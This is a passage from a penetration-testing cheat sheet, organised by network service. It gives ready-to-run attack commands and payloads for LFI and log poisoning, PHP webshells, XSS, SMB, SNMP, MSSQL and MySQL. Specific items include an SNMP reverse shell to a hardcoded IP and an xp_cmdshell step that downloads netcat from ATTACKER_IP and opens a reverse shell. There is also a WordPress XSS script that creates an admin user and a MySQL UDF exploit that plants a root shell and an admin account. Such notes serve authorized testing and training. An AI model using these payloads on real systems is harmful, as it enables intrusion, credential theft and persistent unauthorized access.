Pages (`.jsp`), and even (rarely) Node.js.

You can get code execution by poisoning local files, including log files and
PHP session files with PHP code. Access logs typically have User-Agent in them,
which we can use to inject malicious PHP code.

Common log and PHP session file locations:

- `/var/log/apache2/access.log` - Debian/Ubuntu
- `/var/log/apache2/access.log` - RHEL/CentOS/Fedora
- `/var/log/httpd-access.log` - FreeBSD
- `C:\xampp\apache\logs\access.log` - Windows w/ XAMPP
- c:\Windows\Temp
- /tmp/
- /var/lib/php5
- /var/lib/php/session

Default session filename: `sess_<SESSION_ID>`
(grab SESSION_ID from your cookies in the browser)

The following are some Linux system files that have sensitive information that
are good to try to grab when you have an LFI vulnerability.

```
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/issue
/etc/motd
/etc/mysql/my.cnf
/proc/self/environ
/proc/version
/proc/cmdline
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the file descriptor)
```



Some handy PHP wrappers to grab file contents:
[PHP Documentation: Wrappers](https://www.php.net/manual/en/wrappers.php)

Using php-wrapper with 'filter' to grab local files:

- docs: [https://www.php.net/manual/en/wrappers.php.php](https://www.php.net/manual/en/wrappers.php.php)

```sh
# filter without any processing to grab plaintext:
php://filter/resource=/path/to/flle

# base64 encode file before grabbing (helps grab php source or binary files)
# available starting with PHP 5.0.0
php://filter/convert.base64-encode/resource=/path/to/file

# ROT13 encode file:
php://filter/read=string.rot13/resource=/etc/passwd

# chaining multiple filters with "|":
php://filter/string.toupper|string.rot13/resource=/path/to/file

# list of useful filters:
# https://www.php.net/manual/en/filters.php
string.toupper
string.tolower
string.rot13
convert.base64-encode
convert.base64-decode
zlib.deflate  # i.e. gzip, without headers/trailers
zlib.inflate  # i.e. gunzip
bzip2.compress
bzip2.decompress
```

Some other handy wrappers:

```sh
# if enabled (not default), run commands:
expect://whoami

# Use this one as the query param's value to tell it to look at the POST
# request body for the text to insert there. Useful for injecting complex
# php payloads
php://input
# example POST body: <?php system('whoami'); ?>

# Inject your own string into the file:
data://text/plain;base64,SSBsb3ZlIFBIUAo=  # injects "I love PHP"
# can be used to inject arbitrary php code!

# When injecting php code, a good way to test code execution is with:
<?php phpinfo();?>

# use "data:" to inject executable php code directly into the URL
data:text/plain,<?php phpinfo(); ?>
data:,<?system($_GET['x']);?>&x=ls
data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls

# FILTER BYPASSES:
# Sometimes you can bypass filters or trick PHP not to concatenate a .php file extension onto
# a file path by injecting a NULL byte. E.g.:
?page=../../../etc/passwd%00
# You can take this technique further and URL-encode the entire php://filter
# directive to hopefully bypass server-side filters on it. Or even double-URL-
# encode the string.
# Also try bypassing filters with ....// instead of ../
```



#### 4.5.3.2. One-liner PHP Webshells

Simple one-liner web shells for when you can drop/modify a php file:

```php
<?php system($_GET['cmd']); ?>

<?php echo exec($_POST['cmd']); ?>

<?php echo shell_exec($_REQUEST['cmd']); ?>

<?php echo passthru($_GET['cmd']); ?>
```

Kali has more webshells here: `/usr/share/webshells`, and I have some in the [tools](tools) directory



### 4.5.4. Cross-Site Scripting (XSS)

In all input fields, URL query parameters, and HTTP request headers that get transformed into page content, try the following:

- [ ] Check what remains after any filtering is applied on input: `'';!--"<XSS>=&{()}`
- [ ] Try variations of `<script>alert(1)</script>`



If you can get XSS working, consider possible vectors, especially against admin users:

- [ ] Steal cookies, authentication (OAuth) tokens, and other sensitive data
- [ ] Key-log password entry on login page
- [ ] Perform Cross-Site Request Forgery (CSRF) using victim's/Admin's session (may need to steal token/nonce). Maybe create a new admin user or change admin password?



When injecting XSS javascript payload, you may may want to ensure no characters get filtered. An easy way to ensure that is to encode the payload as Unicode code points.

```javascript
// Use the following code in your browser's console to encode the payload as Unicode code points.
function encode_javascript(minified_js) {
	return [...minified_js].map(function (c) { return c.codePointAt(0); }).join(",")
}
let encoded = encode_javascript("insert_minified_javascript") // replace with your payload
console.log(encoded)
```

Once the payload is encoded, insert the resulting array of integers into the following injected XSS script tag:

```html
<!-- replace digits with output from previous encoder -->
<script>eval(String.fromCodePoint(97,108,101,114,116,40,39,128526,39,41))</script>
<!-- example is code for "alert('😎')" -->
```



Here is an example script payload that creates an admin user on a vulnerable WordPress site by exploiting the vulnerable User-Agent header:

```javascript
// Collect WordPress nonce from admin user
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

// Create new admin account
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=derp&email=derp@derp.com&pass1=herpaderp&pass2=herpaderp&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```



### 4.5.6. WordPress

```sh
wpscan --update --url http://$VICTIM_IP/

# --enumerate options:
# p = Popular plugins
# vp = Vulnerable plugins
# ap = All plugins (takes a while)
# t = Popular themes
# vt = Vulnerable themes
# at = All themes (takes a while)
# cb = Config backups
# tt = Timthumbs
# dbe = Db exports
# u = usernames w/ ids 1-10
# m = media IDs 1-10
# NOTE: Value if no argument supplied: --enumerate vp,vt,tt,cb,dbe,u,m

# other useful flags:
# --login-uri URI
#     The URI of the login page if different from /wp-login.php
# --random-user-agent, --rua
#     Be a bit more stealthy
# --update
#     update the WPScan database before scanning

# username / password bruteforce possible
# -U, --usernames LIST
#     LIST of usernames and/or files w/ usernames to try. e.g. admin,users.txt
#     Will auto-enum users if -U not supplied
# -P, --passwords FILE-PATH
#     path to password file for brute force

# aggressive scan:
wpscan --update \
       --url http://$VICTIM_IP/ \
       --enumerate ap,at,cb,dbe,u \
       --detection-mode aggressive \
       --random-user-agent \
       --plugins-detection aggressive \
       --plugins-version-detection aggressive

# scan with cmsmap (https://github.com/Dionach/CMSmap):
cmsmap -o cmsmap.txt -d http://$VICTIM_IP
```

Also try logging into the Wordpress admin page (`/wp-admin`).

If you can log in, you can update the page template to get code execution. Appearance → Editor → 404 Template (at the right), add a PHP shell.

After admin portal login, also try plugin upload to add a web shell/known vulnerable plugin. Remember to activate plugin after install.

[WordPress Plugin Webshell](https://github.com/p0dalirius/Wordpress-webshell-plugin) - accessible via `/wp-content/plugins/wp_webshell/wp_webshell.php?action=exec&cmd=id`

Maybe upload Media file that has PHP script?

Post exploit: The `wp-config.php` file contains information required by WordPress to connect to the database (credentials).

```bash
# Extract usernames and passwords:
mysql -u USERNAME --password=PASSWORD -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```

Check [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress) for more.


### 4.5.7. Drupal

```sh
droopescan scan drupal http://$VICTIM_IP -t 32 # if drupal found
```



### 4.5.8. Joomla

```sh
joomscan --ec -u $VICTIM_IP # if joomla found
```



## 4.6. 88/749 Kerberos

```sh
# username enumeration with Kerbrute
./kerbrute userenum --dc DC_IP -d DOMAINNAME userlist.txt

# dump all LDAP users
impacket-GetADUsers -all -no-pass -dc-ip DC_IP DOMAIN.tld/
impacket-GetADUsers -all -dc-ip DC_IP DOMAIN.tld/user:password

# ASREPRoasting - Kerberos attack that allows password hashes to be retrieved
# for users that do not require pre-authentication (user has “Do not use
# Kerberos pre-authentication” enabled).
# Find ASREPRoastable users and password hashes (slash after domain required)
impacket-GetNPUsers -dc-ip DC_IP -usersfile found-users.txt DOMAIN.tld/
# be sure to crack the hashes to retrieve the passwords
hashcat -m 18200 /path/to/hashfile.txt /usr/share/wordlists/rockyou.txt --force

# alternate method (done locally on windows box):
# uses: https://github.com/GhostPack/Rubeus
Rubeus.exe asreproast /format:john /outfile:hash.txt

# List smb shares using username you just cracked the hash of
smbclient -L DC_IP -W DOMAIN.tld -U asreproasted-username
```

## 4.7. 110,995 - POP

Post Office Protocol (POP) retrieves email from a remote mail server.

```sh
# banner grabbing
nc -nvC $VICTIM_IP 110
openssl s_client -connect $VICTIM_IP:995 -crlf -quiet

# basic scan
nmap -n -v -p110 -sV --script="pop3-* and safe" -oA nmap/pop3 $VICTIM_IP

# Bruteforcing
hydra -V -f -l USERNAME -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $VICTIM_IP pop3
hydra -V -f -S -l USERNAME -P /path/to/passwords.txt -s 995 $VICTIM_IP pop3

# user enum / log in
nc -nvC $VICTIM_IP 110  # "-C" for \r\n line endings, required
telnet $VICTIM_IP 110   # alternate method
USER username
PASS password
LIST # gets list of emails and sizes
RETR 1 # retrieve first email
# try real (root) and fake users to see if there is a difference in error msgs
```

## 4.8. 111 - RPCbind

Gets you list of ports open using RPC services. Can be used to locate NFS
or rusersd services to pentest next.

```sh
# banner grab
nc -nv $VICTIM_IP 111

# list short summary of rpc services
rpcinfo -s $VICTIM_IP
# list ports of rpc services
rpcinfo -p $VICTIM_IP

# try connecting with null session
rpcclient -U "" $VICTIM_IP
rpcclient $> enumdomusers
rpcclient $> queryuser 0xrid_ID
# see MSRPC (port 135) for more commands
```

## 4.9. 119 - NNTP

Network News Transfer Protocol, allows clients to retrieve (read) and post
(write) news articles to the NNTP (Usenet) server.

```sh
# banner grab, interact/view articles
nc -nvC $VICTIM_IP 119   # "-C" required for \r\n line endings
HELP  # list help on commands (not always available)
LIST  # list newsgroups, with 1st and last article numbers in each group
GROUP newsgroup.name  # select the desired newsgroup to access (e.g. "net.news")
LAST  # view last article in newsgroup
ARTICLE msgID   # view article by ID
NEXT  # go to next article
QUIT
# http://www.tcpipguide.com/free/t_NNTPCommands-2.htm
# https://tools.ietf.org/html/rfc977
```

## 4.10. 135 - MSRPC

```sh
# see the services available through MSRPC
impacket-rpcdump $VICTIM_IP | tee rpcdump.log
# lsa/samr ones let you enumerate users

# interact with MSRPC
# via null session:
rpcclient $VICTIM_IP -U "" -N
# authenticated:
rpcclient $VICTIM_IP -W DOMAIN -U username -P password
# from here can enumerate users, groups, etc.
# (netshareenum, lookupnames, lookupsids, enumdomusers, ...)
srvinfo           # query server info
querydispinfo     # list users
enumdomusers      # list users
enumdomgroups     # list groups
enumdomains       # list domains
querydominfo      # domain info
lsaquery          # get SIDs
lsaenumsid        # get SIDs
lookupsids <sid>  # lookup SID
```

Users enumeration

- **List users**: `querydispinfo` and `enumdomusers`
- **Get user details**: `queryuser <0xrid>`
- **Get user groups**: `queryusergroups <0xrid>`
- **GET SID of a user**: `lookupnames <username>`
- **Get users aliases**: `queryuseraliases [builtin|domain] <sid>`

Groups enumeration

- **List groups**: `enumdomgroups`
- **Get group details**: `querygroup <0xrid>`
- **Get group members**: `querygroupmem <0xrid>`

Aliasgroups enumeration

- **List alias**: `enumalsgroups <builtin|domain>`
- **Get members**: `queryaliasmem builtin|domain <0xrid>`

Domains enumeration

- **List domains**: `enumdomains`
- **Get SID**: `lsaquery`
- **Domain info**: `querydominfo`

More SIDs

- **Find SIDs by name**: `lookupnames <username>`
- **Find more SIDs**: `lsaenumsid`
- **RID cycling (check more SIDs)**: `lookupsids <sid>`

```bash
# dump user information
# can also add creds: [[domain/]username[:password]@]<VictimIP>
impacket-samrdump -port 139 $VICTIM_IP
```

## 4.11. 139,445 - SMB

Port 445 is Server Message Block (SMB). Port 139 is NetBIOS (legacy: 137, 138), which is tied to SMB for backwards compatibility of session management and name services.

Use `enum4linux` or `smbmap` to gather tons of basic info (users, groups, shares, etc.)

Definitely look at [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smb)

SMB Scans:

```sh
# get netbios names of computers, and usernames
sudo nbtscan -r $VICTIM_IP/24 # force port 137, which Win95 hosts need to respond
nbtscan $VICTIM_IP/24

# basic SMB scan, smbmap
smbmap -H $VICTIM_IP
# try with '-u guest' if getting "[!] Authentication error"
# try with '-u null -p null'

# list (only) windows version
smbmap -vH $VICTIM_IP

# recursively list directory contents
smbmap -R -H $VICTIM_IP

# basic scan, enum4linux
enum4linux $VICTIM_IP

# scan all the things
enum4linux -aMld $VICTIM_IP | tee enum4linux.log
# try with guest user if getting nothing via null session:
enum4linux -u guest -aMld $VICTIM_IP | tee enum4linux.log
# may need workgroup: '-w' (smbmap can get it when enum4linux doesn't)

# nmap script scans
nmap --script="safe and smb-*" -n -v -p 139,445 $VICTIM_IP
```

Listing SMB Shares:

```bash
# list available shares using smbmap (no creds)
smbmap -H $VICTIM_IP

# List shares using smbclient (no creds)
smbclient -N -L $VICTIM_IP

# Enumerate shares you have creds for
# Can provide password after '%' with smbclient;
# will prompt for password if omitted.
smbclient -L $VICTIM_IP -W DOMAIN -U 'username[%password]'

# Use  -c 'recurse;ls'  to list dirs recursively with smbclient
# With --pw-nt-hash, the password is provided in NT hash form
smbclient -U 'username%NTHASH' --pw-nt-hash -c 'recurse;ls' //$VICTIM_IP

# List with smbmap, without SHARENAME it lists everything
smbmap [-u "username" -p "password"] -R [SHARENAME] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [SHARENAME] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [SHARENAME] -H <IP> [-P <PORT>] # Pass-the-Hash
```

Listing SMB Shares from Windows:

```bat
:: /all lets us see administrative shares (ending in '$').
:: Can use IP or hostname to specify host.
net view \\VICTIM /all
```

Common shares for Windows:

- C$ - maps to C:/
- ADMIN$ - maps to C:/Windows
- IPC$ - used for RPC
- Print$ - hosts drivers for shared printers
- SYSVOL - only on DCs
- NETLOGON - only on DCs

**NOTE:** In recent versions of Kali, when connecting with `smbclient`, you might see an error message like:

```
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

This is due to the fact that NTLMv1 (insecure) protocol was disabled by default. You can turn it back on by adding the following settings under `GLOBAL` in `/etc/samba/smb.conf`

```
client min protocol = CORE
client max protocol = SMB3
```

Or you can add the flags `-m SMB2` or `-m SMB3` to your invocation of `smbclient` on the command line. However, this 2nd method does not apply to other tools like `enum4linux`

### 4.11.1. SMB Bruteforcing

```sh
nmap --script smb-brute -p 445 $VICTIM_IP
hydra -V -f -l Administrator -P passwords.txt -t 1 $VICTIM_IP smb
```

### 4.11.2. Interacting with SMB

```sh
# tar all files [under a directory (no trailing slash on path)]
smbclient //10.10.10.123/SHARENAME -N -Tc smbfiles.tar [/PATH/TO/DIR]

# recursively get all files (interactive session)
smbclient //$VICTIM_IP/SHARENAME
> mask "" # don't filter any file names
> recurse on # recursively execute commands
> prompt off # don't prompt for file names
> mget * # copy all files matching mask to host

# Interactive smb shell with creds
smbclient '\\TARGET_IP\dirname' -W DOMAIN -U username[%password]
# add --pw-nt-hash to tell it to interpret password as NT hash (don't include LM portion)

smb:\> help  # displays commands to use
smb:\> ls  # list files
smb:\> get filename.txt  # fetch a file

# mount smb share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share

# try executing a command using wmi (can try psexec with '--mode psexec')
smbmap -x 'ipconfig' $VICTIM_IP -u USER -p PASSWORD
```

## 4.12. 161,162,10161,10162 - SNMP

Simple Network Management Protocol (SNMP).

Before getting started, install the MIBs:

```sh
sudo apt install -y snmp snmp-mibs-downloader
sudo download-mibs
```

For resolving further issues with MIBs, see [Using and loading MIBs](https://net-snmp.sourceforge.io/wiki/index.php/TUT:Using_and_loading_MIBS)

Basic SNMP enumeration:

```sh
# nmap snmp scan
nmap --script "snmp* and not snmp-brute" $VICTIM_IP

# quick bruteforce snmp community strings with onesixtyone
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $VICTIM_IP -w 100

# extended bruteforce snmp community strings with hydra
hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt -v $VICTIM_IP snmp

# comprehensive enumeration (system/network/process/software info)
snmp-check $VICTIM_IP

# basic enumeration with onesixtyone, using default 'public' community string
onesixtyone $VICTIM_IP public

# getting system description (like uname -a on Linux systems)
snmpwalk -v2c -c public $VICTIM_IP SNMPv2-MIB::sysDescr
snmpget -v2c -c public $VICTIM_IP SNMPv2-MIB::sysDescr.0

snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.4.1.77.1.2.25 # users
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.4.2.1.2 # processes
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.6.13.1.3 # ports
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.6.3.1.2 # software
snmpwalk -c public -v2c $VICTIM_IP HOST-RESOURCES-MIB::hrSWInstalledName # software

# get ALL info available on SNMP
snmpwalk -v2c -c public $VICTIM_IP
```

Useful SNMP OIDs:

| OID Value              | Info Provided    |
| ---------------------- | ---------------- |
| 1.3.6.1.2.1.25.1.6.0   | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path   |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units    |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name    |
| 1.3.6.1.4.1.77.1.2.25  | User Accounts    |
| 1.3.6.1.2.1.6.13.1.3   | TCP Local Ports  |

Look [here](https://www.rapid7.com/blog/post/2016/05/05/snmp-data-harvesting-during-penetration-testing/) for some other ideas on getting juicy data from SNMP:

- Email addresses
- SNMP community strings
- Password hashes
- Clear text passwords

Also search for OID info at [http://www.oid-info.com/](http://www.oid-info.com/basic-search.htm)

**SNMP config files:** (may contain sensitive data)

- Typical locations:
  - `/etc/`
  - `/etc/snmp/`
  - `~/.snmp/`
- Common filenames:
  - snmp.conf
  - snmpd.conf
  - snmp-config.xml

### 4.12.1. Exploring MIBs with `snmptranslate`

From the [`snmptranslate` Tutorial](https://net-snmp.sourceforge.io/tutorial/tutorial-5/commands/snmptranslate.html):

```sh
# look up numeric OID to get abbreviated name
snmptranslate .1.3.6.1.2.1.1.3.0
snmptranslate -m +ALL .1.3.6.1.2.1.1.3.0

# look up OID node name without fully-qualified path (random access)
snmptranslate -IR sysUpTime.0

# convert abbreviated OID to numeric (dotted-decimal)
snmptranslate -On SNMPv2-MIB::sysDescr.0

# convert abbreviated OID to dotted-text
snmptranslate -Of SNMPv2-MIB::sysDescr.0
# convert numeric (dotted-decimal) to dotted-text
snmptranslate -m +ALL -Of .1.3.6.1.2.1.1.1.0

# get description/extended info about OID node
snmptranslate -Td SNMPv2-MIB::sysDescr.0
# same for numeric
snmptranslate -m +ALL -Td .1.3.6.1.2.1.1.1.0

# get tree view of subset of MIB tree
snmptranslate -Tp -IR system

# look up OID by regex (best match)
snmptranslate -Ib 'sys.*ime'

#  To get a list of all the nodes that match a given pattern, use the -TB flag:
snmptranslate -TB 'vacm.*table'

# find out what directories are searched for MIBS:
net-snmp-config --default-mibdirs # only if installed
snmptranslate -Dinit_mib .1.3 |& grep MIBDIR
```

When using the `-m +ALL` argument, I got the error:

```
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
```

There is a typo in the file that gets pulled by `snmp-mibs-downloader`. The fix is to replace the existing file with a corrected version, which is located [here](http://pastebin.com/raw/p3QyuXzZ).

### 4.12.2. RCE with SNMP

See [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce)

Easy library to do this: [https://github.com/mxrch/snmp-shell.git](https://github.com/mxrch/snmp-shell.git)

```sh
# manually create reverse shell (update listener IP)
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = createAndGo 'nsExtendCommand."derp"' = /usr/bin/env 'nsExtendArgs."derp"' = 'python -c "import sys,socket,os,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection((\"10.10.14.14\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")"'

# trigger reverse shell by reading the OID
snmpwalk -v2c -c private $VICTIM_IP NET-SNMP-EXTEND-MIB::nsExtendObjects

# delete the reverse shell command from the SNMP table
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = destroy
```

This abuses the NET-SNMP-EXTEND-MIB functionality. See [technical writeup](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/)

## 4.13. 389 - LDAP

TODO

## 4.14. 1433 - MSSQL

Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It supports storing and retrieving data across a network (including the Internet).

```sh
# check for known vulns
searchsploit "microsoft sql server"

# if you know nothing about it, try 'sa' user w/o password:
nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER" -sV -p 1433 -oA nmap/safe-ms-sql $VICTIM_IP
# if you don't have creds, you can try to guess them, but be careful not to block
# accounts with too many bad guesses
```

**Post-Exploit PrivEsc**

The user running MSSQL server will have the privilege token **SeImpersonatePrivilege** enabled. You will probably be able to escalate to Administrator using this and [JuicyPotato](https://github.com/ohpe/juicy-potato)

### 4.14.1. MSSQL Bruteforcing

```sh
# Be carefull with the number of password in the list, this could lock-out accounts
# Use the NetBIOS name of the machine as domain, if needed
crackmapexec mssql $VICTIM_IP -d DOMAINNAME -u usernames.txt -p passwords.txt
hydra -V -f -L /path/to/usernames.txt –P /path/to/passwords.txt $VICTIM_IP mssql
medusa -h $VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts $VICTIM_IP
```

More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)

### 4.14.2. MSSQL Interaction

```sql
-- show username
select user_name();
select current_user;  -- alternate way
-- show server version
select @@version;
-- get server name
select @@servername;
-- show list of databases
select name from master.sys.databases;
exec sp_databases;  -- alternate way
-- note: built-in databases are master, tempdb, model, and msdb
-- you can exclude them to show only user-created databases like so:
select name from master.sys.databases where name not in ('master', 'tempdb', 'model', 'msdb');
-- getting table names from a specific database:
select table_name from somedatabase.information_schema.tables;
-- getting column names from a specific table:
select column_name from somedatabase.information_schema.columns where table_name='sometable';
-- get credentials for 'sa' login user:
select name,master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;
```

References:
- [PentestMonkey MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)

### 4.14.3. MSSQL Command Execution

Simple command execution:

```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
```

Interactive sessions:

```sh
# Log in using service account creds if able
sqsh -S $VICTIM_IP -U 'DOMAIN\USERNAME' -P PASSWORD [-D DATABASE]

# probably a simpler tool:
impacket-mssqlclient DOMAIN/USERNAME@$VICTIM_IP -windows-auth
# requires double quotes for xp_cmdshell strings
```

```sql
-- Check if you have server admin rights to enable command execution:
SELECT IS_SRVROLEMEMBER('sysadmin');
go

-- Check if already enabled
-- check if xp_cmdshell is enabled
SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS CMDSHELL_ENABLED FROM sys.configurations WHERE name = N'xp_cmdshell';
go

-- turn on advanced options; needed to configure xp_cmdshell
sp_configure 'show advanced options', '1';RECONFIGURE;
go

-- enable xp_cmdshell
sp_configure 'xp_cmdshell', '1';RECONFIGURE;
go

-- Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami';
go;
-- can usually abbreviate to `xp_cmdshell "command"`

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'whoami' —

-- Get netcat reverse shell
xp_cmdshell 'powershell iwr -uri http://ATTACKER_IP/nc.exe -out c:\users\public\nc.exe'
go
xp_cmdshell 'c:\users\public\nc.exe -e cmd ATTACKER_IP 443'
go
```

## 4.15. 2049 - NFS

[HackTricks](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)

```sh
# scan with scripts
nmap -n -v -p 2049 -sV --script="safe and nfs-*" -oA nmap/nfs-scripts $VICTIM_IP

# list all mountpoints
showmount -a $VICTIM_IP
# list all directories
showmount -d $VICTIM_IP
# list all exports (remote folders you can mount)
showmount -e $VICTIM_IP

# the exports are also in /etc/exports
# look for exports with no_root_squash/no_all_squash setting for privesc
# https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe

# Mounting an exported share:
# mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
# use version 2 because it doesn't have any authentication or authorization
# if mount fails, try without vers=2
# dir may need "/"prefix
# dir is one of showmount -e results (from /etc/exports)
mkdir nfs && \
sudo mount -t nfs -o rw,nolock,vers=2 $VICTIM_IP:DIR nfs

# create user with specific UID to be able to read files on your kali box
# "-s" login shell, "-M" no create home
sudo useradd -u 1014 -s /usr/sbin/nologin -M tempuser
# removing user when done:
sudo deluser --remove-home tempuser && sudo groupdel tempuser
# or just switch to root to read nearly everything:
sudo su
# if needing a specific group:
sudo groupadd -g 1010 tempgroup
sudo usermod -a -G tempgroup tempuser
```

See also: [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)

## 4.16. 3306 - MySQL Enumeration

MySQL listens on `TCP 3306` by default. You'll see it during a port scan or when
running `netstat -tnl`.

Logging in:

```sh
## Locally:
# as root without password (if allowed)
mysql -u root
# same, but prompt for password
mysql -u root -p

## Remotely:
mysql -h HOSTNAME -u root
```

Once logged in, check out the schema and environment:

```sql
-- show list of databases
show databases;
-- Set current database to mysql
use mysql;
-- show tables in current database
show tables;
-- describe the table schema for 'user' table
describe user;

-- show MySQL version (try 2nd cmd if first doesn't work)
select version();
select @@version;
-- show logged-in user
select user();
-- show active database
select database();
-- show system architecture
select @@version_compile_os, @@version_compile_machine;
show variables like '%compile%';
-- show plugin directory (for UDF exploit)
select @@plugin_dir;
show variables like 'plugin%';

-- Try to execute code (try all ways)
\! id
select sys_exec('id')
select do_system('id');

-- Try to read files
select load_file('/etc/passwd');
-- more complex method
create table if not exists test (entry TEXT);
load data local infile "/etc/passwd" into table test fields terminated by '\n';
select * from test;
-- show file privileges of 'test' user
select user,file_priv from mysql.user where user='test';
-- show all privs of current user
select * from mysql.user where user = substring_index(user(), '@', 1) ;

-- Look at passwords
-- MySQL 5.6 and below
select host, user, password from mysql.user;
-- MySQL 5.7 and above
select host, user, authentication_string from mysql.user;

-- add new user with full privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to test identified by 'test' WITH GRANT OPTION;
-- show exact privileges
use information_schema; select grantee, table_schema, privilege_type from schema_privileges;
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
```

### 4.16.1. MySQL UDF Exploit

Exploiting User-Defined Functions in MySQL to get shell execution. First,
ready the UDF library (provides `sys_exec` function) locally on the server.

Prerequisites:
- Write permission (INSERT) for the database’s "func" table
- FILE privileges to copy our library (shared object) to the plugin directory

```sh
# find sqlmap's copy of lib_mysqludf_sys.so (or dll)
locate lib_mysqludf_sys
# found in /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so
# copy the file into the server's /tmp/lib_mysqludf_sys.so for examples below
```

In MySQL terminal:

```sql
-- checking permissions
select * from mysql.user where user = substring_index(user(), '@', 1) ;
-- checking architecture
select @@version_compile_os, @@version_compile_machine;
-- or
show variables like '%compile%';
-- checking plugin directory (where to drop udf library)
select @@plugin_dir;
-- or
show variables like 'plugin%';

-- Linux
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from npn into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
-- alternative: hex encode .so file and dump it directly:
select binary 0x<shellcode> into dumpfile '<plugin_dir>/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
-- then start local shell with `/tmp/rootbash -p` to get root

-- Windows
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_files('C://temp//lib_mysqludf_sys.dll'));
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
-- alternative: dump hex shellcode directly into file:
select binary 0x<shellcode> into dumpfile '<plugin_dir>/lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user hacker P@$$w0rd /add");
SELECT sys_exec("net localgroup Administrators hacker /add");
```

### 4.16.2. Grabbing MySQL Passwords

```sh
# contains plain-text password of the user debian-sys-maint
cat /etc/mysql/debian.cnf

# contains all the hashes of the MySQL users (same as what's in mysql.user table)
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

### 4.16.3. Useful MySQL Files

- Configuration Files:
  - Windows
    - config.ini
    - my.ini
    - windows\my.ini
    - winnt\my.ini
    - INSTALL_DIR/mysql/data/
  - Unix
    - my.cnf
    - /etc/my.cnf
    - /etc/mysql/my.cnf
    - /var/lib/mysql/my.cnf
    - ~/.my.cnf
    - /etc/my.cnf
- Command History:
  - ~/.mysql.history
- Log Files:
  - connections.log
